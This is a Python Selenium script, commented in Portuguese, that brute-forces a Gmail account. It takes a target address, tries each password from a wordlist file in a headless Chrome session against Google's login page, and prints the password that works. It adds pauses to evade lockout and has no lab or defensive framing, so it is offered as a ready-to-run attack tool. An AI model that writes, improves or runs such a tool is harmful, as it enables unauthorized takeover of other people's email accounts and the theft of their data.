import time
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

def test_gmail_password(email, password, driver):
    """
    Testa se a senha é válida para o Gmail fornecido
    """
    try:
        # Acessa a página de login do Gmail
        driver.get("https://accounts.google.com/")
        print(f"Tentando com senha: {password}")
        
        # Aguarda o campo de email carregar
        wait = WebDriverWait(driver, 10)
        
        # Encontra o campo de email e insere o email
        email_input = wait.until(EC.presence_of_element_located((By.ID, "identifierId")))
        email_input.clear()
        email_input.send_keys(email)
        
        # Clica no botão "Próximo"
        next_button = driver.find_element(By.ID, "identifierNext")
        next_button.click()
        
        # Aguarda o campo de senha aparecer
        password_input = wait.until(EC.presence_of_element_located((By.NAME, "Passwd")))
        password_input.clear()
        password_input.send_keys(password)
        
        # Clica no botão "Próximo" para submeter a senha
        password_next = driver.find_element(By.ID, "passwordNext")
        password_next.click()
        
        # Aguarda alguns segundos para verificar o resultado
        time.sleep(3)
        
        # Verifica se o login foi bem sucedido
        try:
            # Tenta encontrar algum elemento que indica que o login foi bem sucedido
            # Por exemplo, o ícone de perfil ou "Gmail" no título
            if "Gmail" in driver.title or "Inbox" in driver.title:
                print(f"\n✅ SENHA CORRETA ENCONTRADA: {password}")
                return True
        except:
            pass
        
        # Verifica se houve erro de senha
        try:
            error_element = driver.find_element(By.XPATH, "//div[contains(text(), 'Senha incorreta')]")
            if error_element:
                print(f"❌ Senha incorreta: {password}")
                return False
        except:
            pass
            
        # Se chegou aqui, pode ser que tenha outro erro
        print(f"⚠️ Resultado inconclusivo para: {password}")
        return False
        
    except TimeoutException:
        print(f"⏰ Timeout ao testar senha: {password}")
        return False
    except Exception as e:
        print(f"❌ Erro ao testar senha {password}: {str(e)}")
        return False

def main():
    # Solicita o email Gmail
    email = input("Digite o email Gmail para testar: ").strip()
    
    if not email or "@gmail.com" not in email:
        print("❌ Por favor, digite um email Gmail válido.")
        return
    
    # Verifica se o arquivo de wordlist existe
    wordlist_file = "wordlist.txt"
    if not os.path.exists(wordlist_file):
        print(f"❌ Arquivo '{wordlist_file}' não encontrado na pasta atual.")
        print(f"Pasta atual: {os.getcwd()}")
        return
    
    # Lê as senhas do arquivo
    try:
        with open(wordlist_file, 'r', encoding='utf-8') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"❌ Erro ao ler wordlist: {str(e)}")
        return
    
    if not passwords:
        print("❌ Wordlist vazia ou não contém senhas válidas.")
        return
    
    print(f"\n🔍 Iniciando teste para: {email}")
    print(f"📝 Total de senhas a testar: {len(passwords)}")
    print("=" * 50)
    
    # Configura o driver do Chrome
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')  # Executa em segundo plano (comente para ver visualmente)
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        
        # Inicializa o driver
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(5)
        
        found = False
        for i, password in enumerate(passwords, 1):
            print(f"\n[{i}/{len(passwords)}]", end=" ")
            
            if test_gmail_password(email, password, driver):
                found = True
                print("=" * 50)
                print(f"🎉 SENHA CORRETA: {password}")
                print("=" * 50)
                break
            
            # Pequena pausa entre tentativas para evitar bloqueio
            time.sleep(1)
        
        if not found:
            print("\n❌ Nenhuma senha correta encontrada na wordlist.")
        
        driver.quit()
        
    except Exception as e:
        print(f"❌ Erro ao configurar o driver: {str(e)}")
        print("Certifique-se de ter o Chrome e o ChromeDriver instalados.")
        print("Para instalar: pip install selenium webdriver-manager")
        
        # Alternativa com webdriver_manager
        print("\nTentando instalar dependências...")
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            from selenium.webdriver.chrome.service import Service
            
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            
            print("✅ Driver configurado com sucesso!")
            # Continuar com o loop de testes...
            
        except ImportError:
            print("ℹ️ Execute: pip install selenium webdriver-manager")
            return

if __name__ == "__main__":
    main()